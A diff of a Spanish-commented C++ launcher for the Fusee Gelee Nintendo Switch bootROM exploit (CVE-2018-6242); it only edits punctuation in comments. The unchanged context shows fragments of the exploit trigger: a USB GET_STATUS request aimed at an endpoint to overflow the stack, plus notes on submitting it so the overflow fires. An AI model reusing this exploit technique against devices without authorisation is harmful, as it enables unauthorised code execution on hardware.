@@ -1,4 +1,4 @@
-// launcher_rcm.cpp — Motor de inyeccion Fusee Gelee para Linux
+// launcher_rcm.cpp, Motor de inyeccion Fusee Gelee para Linux
 // Replicacion EXACTA del motor de NXLoader (PrimaryLoader.java + native-lib.cpp,
 // David Buchanan / eliboa), que esta validado funcionando en la unidad del usuario.
 // Basado en fusee gelee (CVE-2018-6242) por Kate Temkin / ReSwitched.
@@ -33,7 +33,7 @@ static int trigger_exploit(int fd, int length, int mode) {
     struct usb_ctrlrequest *ctrl_req = (struct usb_ctrlrequest *) buffer;
     // CRITICO: el PoC oficial (ktemkin) dispara el overflow con recipient ENDPOINT
     // (0x82). GET_STATUS + INTERFACE (0x81, como NXLoader) NO esta en la lista de
-    // handlers vulnerables del bootROM — el overflow del stack no desencadena.
+    // handlers vulnerables del bootROM, el overflow del stack no desencadena.
     ctrl_req->bRequestType = USB_DIR_IN | USB_RECIP_ENDPOINT;
     ctrl_req->bRequest = USB_REQ_GET_STATUS;
     ctrl_req->wLength = length;
@@ -61,7 +61,7 @@ static int trigger_exploit(int fd, int length, int mode) {
         return r < 0 ? -5 : 0;
     }
 
-    // PoC oficial (ktemkin, report/fusee_gelee.md): SOLO SUBMITURB — el setup
+    // PoC oficial (ktemkin, report/fusee_gelee.md): SOLO SUBMITURB, el setup
     // packet viaja al device en el momento del submit y el overflow ocurre en el
     // device. NO hacer DISCARDURB: en Linux desktop la cancelacion gana la carrera
     // y el setup nunca se transmite (el error de NXLoader/Android no aplica aca).
